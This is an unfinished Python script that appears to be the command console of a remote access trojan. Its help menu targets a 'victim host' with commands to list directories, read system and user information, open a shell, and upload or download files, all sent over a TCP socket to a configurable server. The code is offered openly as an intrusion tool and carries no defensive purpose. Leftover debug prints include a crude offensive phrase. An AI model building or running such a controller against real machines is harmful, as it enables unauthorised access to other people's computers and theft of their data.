from socket import socket, AF_INET, SOCK_STREAM
from os import system, name

# IP & port of the server

def_commands = """
    pwd         show current working directory
    user        show the user of victim host
    listdir     list every item in the current directory
    sysinfo     show information about the victim system
    kill        kill the client and server
    shell       open a shell interface on victim
    upload      upload a file
    download    download a file
    """

def send_recv_command(client_connection, user_input):
        print("sending")
        client_connection.send(user_input.encode()[:2048])
        print("send")
        response = client_connection.recv(2048)
        print("die")
        response = response.decode("utf-8")
        print(f"{response}")

def run_connection():

    simple_cmd = ["listdir", "user", "sysinfo", "pwd", "upload", "download", "clear"]

    server_ip = "127.0.0.1" # replace with server IP
    port = 64780 # replace with server port

    try:
        client_connection = socket(AF_INET, SOCK_STREAM)
        client_connection.connect((server_ip, port))
        response = client_connection.recv(2048).decode("utf-8")
        print("connection established with", response)
    except ConnectionRefusedError:
        print("server not in active state")

    while True:

       # input command
        try:
            user_input = str(input("Enter command: "))
            print("big gay")

            # check if there is any input, if not break
            if user_input == "help":
                print (def_commands)
                continue
            elif user_input == "kill": # kills server and client
                send_recv_command(client_connection, user_input)
                #client_connection.send(user_input.encode()[:2048])
                break
            elif user_input == "exit":
                break
            #elif user_input == "shell":
            #    while True:
            elif user_input in simple_cmd:
                try:
                    print("test")
                    send_recv_command(client_connection, user_input)
                except:
                    print("server refused")
                print("test")

            else:
                print ("No input was entered")
                system('cls' if name == 'nt' else 'clear')
                print("please enter a command")
                continue
        except KeyboardInterrupt:
            user_input = "reset"
            client_connection.send(user_input.encode()[:2048])
            #client_connection.shutdown(1)
            client_connection.close()
            break

if __name__ == "__main__":
    run_connection()
